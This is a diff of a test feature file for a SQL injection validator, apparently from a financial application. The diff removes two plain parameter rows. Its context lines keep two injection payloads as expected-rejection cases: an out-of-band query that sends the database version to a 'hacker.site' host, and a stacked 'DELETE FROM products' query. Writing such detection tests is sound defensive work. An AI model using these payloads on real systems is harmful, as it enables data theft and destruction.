@@ -90,12 +90,10 @@ Feature: Security Utils SQL validator
       | subresourceId                                                            | 23    |                                                                                       |
       | checker                                                                  | 23    |                                                                                       |
       | savingsAccountNo                                                         | 23    |                                                                                       |
-      | loanAccountNo                                                            | 23    |                                                                                       |
       | groupName                                                                | 23    |                                                                                       |
       | entityName                                                               | 23    |                                                                                       |
       | madeOnDate                                                               | 23    |                                                                                       |
       | id                                                                       | 23    |                                                                                       |
-      | loanId                                                                   | 23    |                                                                                       |
       | actionName                                                               | 23    |                                                                                       |
       | select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));        | 17    | SQL validation error: invalid SQL statement (detected 'detect-out-of-bands' pattern)  |
       | 1; DELETE FROM products                                                  | 19    | SQL validation error: invalid SQL statement (detected 'inject-stacked-query' pattern) |
